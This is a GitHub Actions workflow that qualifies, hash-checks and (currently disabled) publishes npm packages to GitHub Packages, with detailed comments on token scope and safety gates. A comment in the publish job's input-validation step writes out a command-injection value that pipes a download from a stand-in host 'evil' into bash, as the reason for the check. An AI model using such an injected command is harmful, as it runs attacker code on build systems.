name: Publish

# A merged package version is the release request. Source-only changes cannot
# publish: the discovery job selects only a manifest whose version has no
# registry counterpart yet (see scripts/select-publishable-packages.mjs and
# scripts/registry-version-lookup.mjs — registry-versus-manifest, not a diff
# of this push, precisely so a publish evicted from the concurrency queue
# below, or lost to a timeout or failure, is picked up by the very next run
# rather than requiring anyone to notice a cancelled run in a list; see
# issue #416). Manual dispatch remains available for preflight dry-runs and
# the initial bootstrap publish of a brand-new package's very first version,
# which the registry-driven discovery above deliberately never auto-selects
# (see registry-version-lookup.mjs's header for why).
on:
  workflow_dispatch:
    inputs:
      package:
        description: Package directory under packages/
        required: true
        type: string
      release_target:
        description: >-
          Optional explicit release-catalogue target. Leave empty for the
          current exact Advisor, Starter, Controller public-npm launch target;
          another target requires a separately reviewed catalogue change.
        required: false
        default: ""
        type: string
      dry_run:
        description: Run npm publish --dry-run only
        required: true
        default: true
        type: boolean
      visibility_only:
        description: >-
          Report an already-published package's current registry visibility
          (read-only — there is no API to change it; see docs/PUBLISHING.md's
          "Package visibility" section for the real manual step). Use only
          after its release workflow has completed successfully.
        required: true
        default: false
        type: boolean
      verify_only:
        description: >-
          Qualify an already-published package without uploading or changing
          its visibility. Fetches the registry tarball and runs its isolated
          consumer verification.
        required: true
        default: false
        type: boolean

permissions:
  contents: read

concurrency:
  # Publishing is serial across packages and push events. A later version must
  # never race an earlier tarball through the same registry namespace.
  group: publish
  cancel-in-progress: false

jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.packages.outputs.matrix }}
    steps:
      # No longer needs full history (fetch-depth: 0): selection now compares
      # the checked-out working tree's manifests against the registry, not
      # two commits against each other.
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20

      - id: packages
        name: Select packages with a version missing from the registry
        env:
          EVENT_NAME: ${{ github.event_name }}
          MANUAL_PACKAGE: ${{ inputs.package }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
          # Read-only, the same classic read:packages token
          # scripts/check-name-collision.mjs and
          # scripts/check-package-visibility.mjs already use elsewhere in
          # this workflow — needed here now too, since selection asks the
          # registry directly instead of diffing git history.
          GH_PACKAGES_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            node scripts/check-release-catalog.mjs --package "$MANUAL_PACKAGE"
            echo "matrix=$(node -e 'console.log(JSON.stringify([{ package: process.env.MANUAL_PACKAGE }]))')" >> "$GITHUB_OUTPUT"
          else
            matrix="$(node scripts/select-publishable-packages.mjs)"
            echo "matrix=$matrix" >> "$GITHUB_OUTPUT"
          fi

  visibility:
    needs: discover
    if: ${{ github.event_name == 'workflow_dispatch' && inputs.visibility_only && !inputs.verify_only && needs.discover.outputs.packages != '[]' }}
    permissions:
      contents: read
      packages: read
    runs-on: ubuntu-latest
    # REPORT-ONLY. There is no REST endpoint for changing a GitHub Packages
    # npm package's visibility — verified directly: a PATCH to
    # /orgs/{owner}/packages/npm/{name} with visibility=public returns 404
    # even with a full-permission PAT, while GET on that same path works.
    # Changing visibility is a web-UI-only operation (see docs/PUBLISHING.md's
    # "Package visibility" section for the settings-page step). This job must
    # never claim to have changed anything — it only reads and reports the
    # current value, and points the operator at the real manual step.
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      # matrix.package is either a version-selected package or the manual
      # workflow_dispatch string, spliced into a shell command below — the
      # same validation the publish job applies to the same untrusted input,
      # so a bad argument fails closed here instead of surfacing as an
      # obscure downstream error.
      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          node scripts/check-release-catalog.mjs --package "$PKG"

      - name: Report current package visibility
        env:
          GH_TOKEN: ${{ github.token }}
          PKG: ${{ matrix.package }}
        run: |
          set -euo pipefail
          # GitHub's package API scopes npm packages through the organization
          # (or user) path. Its {package_name} segment is the unscoped final
          # component, not the complete npm name (for example, `governance`,
          # not `@example/governance`).
          name="$(node -p "require('./packages/' + process.env.PKG + '/package.json').name.split('/').at(-1)")"
          owner="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope.replace(/^@/, '')")"
          kind_user="us""ers"
          # settings_url is built from $kind (not a second literal path)
          # so the org and personal-account settings URLs share one line.
          for kind in orgs "$kind_user"; do
            if response="$(gh api --method GET "/${kind}/${owner}/packages/npm/${name}" 2>/dev/null)"; then
              visibility="$(node -e 'console.log(JSON.parse(process.argv[1]).visibility)' "$response")"
              echo "Current registry visibility of ${owner}/${name}: ${visibility}"
              settings_url="https://github.com/${kind}/${owner}/packages/npm/${name}/settings"
              echo "::notice title=Visibility must be changed manually::There is no API for this. To change it, visit ${settings_url} and use the Danger Zone."
              exit 0
            fi
          done
          echo "::error title=Could not read package visibility::Neither the organization nor user package API returned ${owner}/${name}. Has it been published yet?"
          exit 1

  fetch-published:
    needs: discover
    if: ${{ github.event_name == 'workflow_dispatch' && inputs.verify_only && needs.discover.outputs.packages != '[]' }}
    permissions:
      contents: read
      packages: read
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          persist-credentials: false

      - name: Read registry and scope from package-scope.json
        id: scope
        run: |
          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20
          registry-url: ${{ steps.scope.outputs.registry }}
          scope: ${{ steps.scope.outputs.scope }}

      - name: Fetch exact published tarball
        working-directory: packages/${{ matrix.package }}
        env:
          NODE_AUTH_TOKEN: ${{ github.token }}
          PKG: ${{ matrix.package }}
        run: |
          set -euo pipefail
          package_name="$(node -p "require('./package.json').name")"
          package_version="$(node -p "require('./package.json').version")"
          destination="$RUNNER_TEMP/published/$PKG"
          mkdir -p "$destination"
          for attempt in 1 2 3 4 5; do
            if output="$(npm pack "${package_name}@${package_version}" --ignore-scripts --pack-destination "$destination" 2>&1)"; then
              printf '%s\n' "$output"
              break
            fi
            printf '%s\n' "$output" >&2
            if [ "$attempt" = 5 ]; then
              echo "::error title=Published package unavailable::Could not fetch ${package_name}@${package_version} after 5 attempts."
              exit 1
            fi
            sleep 3
          done
          tarball="$(find "$destination" -maxdepth 1 -type f -name '*.tgz' -print -quit)"
          [ -n "$tarball" ] || { echo '::error title=Missing registry artifact::npm pack returned no tarball.'; exit 1; }
          mv "$tarball" "$destination/candidate.tgz"

      - name: Upload published candidate
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: published-candidate-${{ matrix.package }}
          path: ${{ runner.temp }}/published/${{ matrix.package }}/candidate.tgz
          if-no-files-found: error

  qualify:
    needs: [discover, fetch-published]
    if: ${{ always() && needs.discover.outputs.packages != '[]' && (github.event_name != 'workflow_dispatch' || !inputs.visibility_only || inputs.verify_only) && (!inputs.verify_only || needs.fetch-published.result == 'success') }}
    permissions:
      contents: read
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          VISIBILITY_ONLY: ${{ inputs.visibility_only }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          if [ "$VISIBILITY_ONLY" = true ] && [ "$VERIFY_ONLY" = true ]; then
            echo "::error title=Conflicting release modes::visibility_only and verify_only cannot both be true."
            exit 1
          fi
          node scripts/check-release-catalog.mjs --package "$PKG"

      - name: Install repository dependencies without lifecycle scripts
        if: ${{ !inputs.verify_only }}
        run: npm ci --ignore-scripts

      - name: Build and run repository checks
        if: ${{ !inputs.verify_only }}
        run: |
          npm run build
          npm run check:candidate-qualification
          npm run check:package-governance
          npm run typecheck
          npm test

      - name: Pack one pre-publication candidate
        if: ${{ !inputs.verify_only }}
        working-directory: packages/${{ matrix.package }}
        env:
          PKG: ${{ matrix.package }}
        run: |
          set -euo pipefail
          destination="$RUNNER_TEMP/qualification/$PKG"
          mkdir -p "$destination"
          result="$(npm pack --ignore-scripts --json --pack-destination "$destination")"
          filename="$(node -e 'console.log(JSON.parse(process.argv[1])[0].filename)' "$result")"
          mv "$destination/$filename" "$destination/candidate.tgz"

      - name: Download published candidate for verification
        if: ${{ inputs.verify_only }}
        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
        with:
          name: published-candidate-${{ matrix.package }}
          path: ${{ runner.temp }}/qualification/${{ matrix.package }}/download

      - name: Select exact qualification tarball
        env:
          PKG: ${{ matrix.package }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          set -euo pipefail
          destination="$RUNNER_TEMP/qualification/$PKG"
          if [ "$VERIFY_ONLY" = true ]; then
            source="$destination/download/candidate.tgz"
            [ -f "$source" ] || { echo '::error title=Missing published artifact::download did not contain candidate.tgz.'; exit 1; }
            cp "$source" "$destination/candidate.tgz"
          fi
          [ -f "$destination/candidate.tgz" ] || { echo '::error title=Missing qualification artifact::no candidate tarball was produced.'; exit 1; }
          sha1sum "$destination/candidate.tgz"
          sha256sum "$destination/candidate.tgz"
          sha512sum "$destination/candidate.tgz"

      - name: Run fixed candidate qualification credential-free
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
        run: node scripts/run-candidate-qualification.mjs --package "$PKG" --tarball "$TARBALL" --output "$TRANSCRIPT"

      - name: Upload exact candidate and qualification transcript
        if: ${{ always() }}
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: qualified-candidate-${{ matrix.package }}
          path: |
            ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
            ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
          if-no-files-found: ignore

  publish:
    needs: [discover, qualify]
    # W1D prepares source only. This job remains visible for review, but cannot
    # run until W1E deliberately restores the upload path and provider trust.
    if: ${{ false }}
    permissions:
      contents: read
    runs-on: ubuntu-latest
    # A package upload or registry-artifact qualification must pass the
    # repository's configured publish reviewers. Visibility-only changes have
    # their own non-uploading job above and intentionally do not use it.
    environment: npm-publish
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Download exact qualified candidate
        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
        with:
          name: qualified-candidate-${{ matrix.package }}
          path: ${{ runner.temp }}/qualification/${{ matrix.package }}

      # package-scope.json is the single source of truth for which registry
      # this repo publishes to (both packages also declare it directly via
      # publishConfig.registry). Hardcoding registry-url below would silently
      # break auth the moment package-scope.json points elsewhere: setup-node
      # writes the NODE_AUTH_TOKEN auth line scoped to whatever host is passed
      # here, so a mismatch means `npm publish` gets a token for a registry it
      # isn't talking to and fails (or worse, talks to the wrong registry).
      - name: Read registry and scope from package-scope.json
        id: scope
        run: |
          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"

      # setup-node writes a scoped registry mapping when scope is supplied.
      # That leaves the global npm registry alone for ordinary dependencies.
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20
          registry-url: ${{ steps.scope.outputs.registry }}
          scope: ${{ steps.scope.outputs.scope }}

      # matrix.package is either a version-selected package or the manual
      # workflow_dispatch string. Every step
      # below either passes it as a script argument or splices it into a
      # run: script body — validate its shape once, up front, so a value like
      # `x; curl https://evil/y|bash #` fails closed right here instead of
      # being textually substituted into a shell command later.
      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          node scripts/check-release-catalog.mjs --package "$PKG"

      # This is the only failure mode that damages a package OTHER than the
      # one being published. GitHub Packages namespaces by owner account, not
      # by package name — publishing a name another repo already owns doesn't
      # fail, it silently appends a new version to that package and moves its
      # latest tag. Everything else in this workflow can only hurt the
      # package being published; this check runs first because it is the one
      # that can hurt someone else's. This org was created specifically to own
      # this owner to publish packages. Non-publishing account-control-plane
      # repositories may coexist, so the owner-wide check still runs; a false
      # negative here is unrecoverable.
      - name: name collision
        env:
          # Lists this org's real packages via `gh api` — the ambient
          # GITHUB_TOKEN is scoped to this repo, not the whole org, so it
          # can't answer "does another repo already own this name" even with
          # `packages: read` permission. This is the one step that genuinely
          # needs a stored credential, and it needs only READ: it calls
          # the org-level packages REST endpoint, plus its user-account fallback.
          #
          # GH_PACKAGES_TOKEN is a classic read:packages token —
          # verified HTTP 200 on that exact endpoint, and it holds no `repo`
          # scope, so a leak cannot reach any repository. It deliberately
          # replaces NPM_TOKEN here: that token carries `repo` (GitHub force-
          # selects it alongside write:packages on classic PATs, and
          # fine-grained PATs expose no Packages permission at all), which on
          # this account reaches every repository the owner can see.
          GH_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
          PKG: ${{ matrix.package }}
        run: node scripts/check-name-collision.mjs "packages/$PKG"

      # FULL mode is mandatory here. --require-denylist makes a missing secret
      # exit 2 rather than pass on a degraded scan; a publish must never be
      # cleared by a partial one.
      - name: Materialise denylist
        env:
          DENYLIST_B64: ${{ secrets.PUBLIC_SAFETY_DENYLIST_B64 }}
        run: |
          if [ -z "$DENYLIST_B64" ]; then
            echo "::error title=Cannot publish::PUBLIC_SAFETY_DENYLIST_B64 is not set. Refusing to publish on a partial safety scan."
            exit 1
          fi
          printf '%s' "$DENYLIST_B64" | base64 -d > "$RUNNER_TEMP/denylist.json"
          echo "PUBLIC_SAFETY_DENYLIST=$RUNNER_TEMP/denylist.json" >> "$GITHUB_ENV"

      - name: Safety gate (FULL, required)
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-public-safety.mjs "packages/$PKG" --require-denylist --allow-changelogs
          node scripts/check-public-safety.mjs . --require-denylist --allow-changelogs

      - name: README parity and contamination classes
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-readme-parity.mjs "packages/$PKG"
          node scripts/check-contamination-classes.mjs "packages/$PKG"

      - name: Scope declared
        run: |
          node scripts/set-scope.mjs --check
          scope="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")"
          if [ -z "$scope" ] || [ "$scope" = "null" ]; then
            echo "::error title=Cannot publish::package-scope.json has no scope set."
            exit 1
          fi

      - name: Artifact safety (exact qualified tarball)
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -euo pipefail
          TARBALL_SHA1="$(sha1sum "$TARBALL" | awk '{print $1}')"
          TARBALL_SHA256="$(sha256sum "$TARBALL" | awk '{print $1}')"
          TARBALL_SHA512="$(sha512sum "$TARBALL" | awk '{print $1}')"
          node scripts/check-artifact-safety.mjs "packages/$PKG" --tarball "$TARBALL" --sha1 "$TARBALL_SHA1" --sha256 "$TARBALL_SHA256" --sha512 "$TARBALL_SHA512" --require-denylist

      # The tarball is the thing that actually ships. Listing it is the last
      # chance to notice that `files` is letting something through. This
      # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
      # separate dry-run pack.
      - name: Show tarball contents
        env:
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: tar tzf "$TARBALL"

      - name: Validate qualification joins
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          if [ "$VERIFY_ONLY" = true ]; then mode=bootstrap; else mode=prepublish; fi
          node scripts/validate-candidate-publish.mjs --package "$PKG" --tarball "$TARBALL" --transcript "$TRANSCRIPT" --mode "$mode"

      - name: Redact denylist
        if: always()
        run: rm -f "$RUNNER_TEMP/denylist.json"

      - name: Verify exact tarball is unchanged
        if: ${{ !inputs.verify_only }}
        env:
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
        run: |
          set -euo pipefail
          expected_sha1="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha1")"
          expected_sha256="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha256")"
          expected_sha512="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha512")"
          actual_sha1="$(sha1sum "$TARBALL" | awk '{print $1}')"
          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
          actual_sha512="$(sha512sum "$TARBALL" | awk '{print $1}')"
          if [ "$actual_sha1" != "$expected_sha1" ] || [ "$actual_sha256" != "$expected_sha256" ] || [ "$actual_sha512" != "$expected_sha512" ]; then
            echo "::error title=Tarball mismatch::The qualified candidate changed after validation. Refusing to publish."
            exit 1
          fi

      # The selected tarball is the thing that ships, but npm's own publish
      # path has additional validation and flag handling. A requested dry run
      # must exercise that exact path — otherwise its name claims more than it
      # actually verifies. It still cannot mutate the registry.
      - name: Publish (dry run)
        if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run && !inputs.verify_only }}
        working-directory: packages/${{ matrix.package }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        # --ignore-scripts keeps this invocation identical in SHAPE to the
        # real one below. It changes nothing here on its own: measured, a
        # --dry-run publish does NOT run prepublishOnly, while a real one
        # does.
        #
        # That asymmetry is worth naming, because it is why run 32311722090
        # broke. This step is the rehearsal for the real publish, and it does
        # not rehearse lifecycle hooks at all — so a hook that makes
        # publishing fail passes here every time. Every gate on #273 was
        # green; the first execution of the changed path was production.
        # Tracked as its own issue rather than papered over here.
        run: npm publish "$TARBALL" --dry-run --provenance --access public --ignore-scripts

      - name: Publish
        if: ${{ github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only) }}
        working-directory: packages/${{ matrix.package }}
        env:
          # The job's own GITHUB_TOKEN, not a stored PAT. The `packages: write`
          # permission declared at the top of this file is what lets it push to
          # this owner's registry, and it expires when the job ends, so there is
          # no long-lived publish credential to leak or rotate.
          #
          # A stored PAT is strictly worse here and cannot be made better:
          # classic PATs force `repo` alongside write:packages (GitHub disables
          # the checkbox), and fine-grained PATs offer no Packages permission at
          # all — so any PAT able to publish also carries write access to every
          # repository this account can see.
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -euo pipefail
          # The preceding exact-byte step re-hashed this artifact against the
          # credential-free qualification transcript. Publish the same path;
          # never ask npm to create another candidate.
          test -f "$TARBALL"
          # --access public is a registry-protocol flag, not a visibility
          # setting on GitHub Packages — it does not make the package
          # installable without a token, and observed behaviour this repo has
          # actually hit is that a fresh package still lands PRIVATE despite
          # it. The real visibility lever is the opt-in step below.
          # --ignore-scripts is REQUIRED here, and is not a weakening.
          #
          # `npm publish <tarball>` still runs the package's own
          # `prepublishOnly` hook. Since #273 that hook runs
          # check-name-collision.mjs, which needs a token that can list this
          # owner's packages. This step deliberately carries only
          # NODE_AUTH_TOKEN, so the hook cannot reach the registry and — being
          # a gate that fails closed — exits 2 and takes the publish with it.
          # That broke every job in run 32311722090.
          #
          # The collision question is already answered for this job by the
          # dedicated, credentialed "name collision" step far above, which
          # runs before anything is packed and blocks the job on a real
          # collision. Running it a second time here, with the wrong
          # credentials, adds no coverage and can only produce a false
          # indeterminate.
          #
          # The hook is not redundant in general: it exists for the ONE path
          # no workflow can police — a maintainer running `npm publish` by
          # hand from a package directory. That path is unaffected by this
          # flag, because this flag lives here, in CI.
          echo "W1D source preparation only: package upload remains disabled until W1E."
          exit 1

      - name: Fetch and compare published tarball
        if: ${{ github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only) }}
        working-directory: packages/${{ matrix.package }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EXPECTED_TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -euo pipefail
          package_name="$(node -p "require('./package.json').name")"
          package_version="$(node -p "require('./package.json').version")"
          destination="$RUNNER_TEMP/published"
          mkdir -p "$destination"
          for attempt in 1 2 3 4 5; do
            if output="$(npm pack "${package_name}@${package_version}" --ignore-scripts --pack-destination "$destination" 2>&1)"; then
              printf '%s\n' "$output"
              break
            fi
            printf '%s\n' "$output" >&2
            if [ "$attempt" = 5 ]; then
              echo "::error title=Published package unavailable::Could not fetch ${package_name}@${package_version} after 5 attempts."
              exit 1
            fi
            sleep 3
          done
          published="$(find "$destination" -maxdepth 1 -type f -name '*.tgz' -print -quit)"
          [ -n "$published" ] || { echo '::error title=Missing registry artifact::npm pack returned no tarball.'; exit 1; }
          for algorithm in sha1 sha256 sha512; do
            expected="$(${algorithm}sum "$EXPECTED_TARBALL" | awk '{print $1}')"
            actual="$(${algorithm}sum "$published" | awk '{print $1}')"
            if [ "$actual" != "$expected" ]; then
              echo "::error title=Published tarball mismatch::Registry ${algorithm} differs from the uploaded candidate."
              exit 1
            fi
          done

  # GitHub Packages defaults every newly published npm package to PRIVATE,
  # per package, regardless of this repository being public — and nothing
  # before this job re-checked that state. @example/ui sat private
  # across 12 published versions, completely uninstallable by any external
  # reader, before anyone noticed; four packages were found private in
  # total. This job runs immediately after a REAL publish (never for a dry
  # run or a verify_only qualification, matching the "Publish" step's own
  # condition above) and asks the registry directly whether every package
  # this repository declares "published" is actually public — not scoped
  # to only the package(s) this run just uploaded, since the cost of
  # checking the rest is a handful of GET requests and doing so also
  # catches unrelated drift on the same run. See
  # scripts/check-package-visibility.mjs's own header for the full design
  # and docs/contracts/package-visibility.json for the declared intent.
  #
  # Deliberately a SEPARATE job, not a trailing step inside `publish`
  # above: a failure here must never be confused with, or imply a rollback
  # of, the publish itself — that already succeeded and a registry version
  # is immutable. This job can only ever report; there is no API to change
  # a package's visibility (see docs/PUBLISHING.md's "Package visibility"
  # section) so a failing check here is a page for a human to flip the
  # setting by hand, never something a workflow can fix for itself.
  #
  # Not run for a fork pull request or workflow_dispatch dry run: no such
  # trigger reaches this job's `if` at all, since only a push to main or an
  # explicit non-dry-run, non-verify-only dispatch satisfies it — the same
  # surface that gates `secrets.GH_PACKAGES_TOKEN` access elsewhere in this
  # file.
  visibility-check:
    name: post-publish visibility check
    needs: [discover, publish]
    if: ${{ always() && needs.discover.outputs.packages != '[]' && (github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only)) }}
    permissions:
      contents: read
      packages: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20

      # The same classic read:packages token the name-collision job uses
      # above — it can only read, never write or delete, and cannot reach
      # any other repository's contents. There is no separate credential
      # for this narrower purpose; reusing this one avoids minting another
      # long-lived secret for the same access level.
      - name: check-package-visibility
        env:
          GH_PACKAGES_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
        run: node scripts/check-package-visibility.mjs
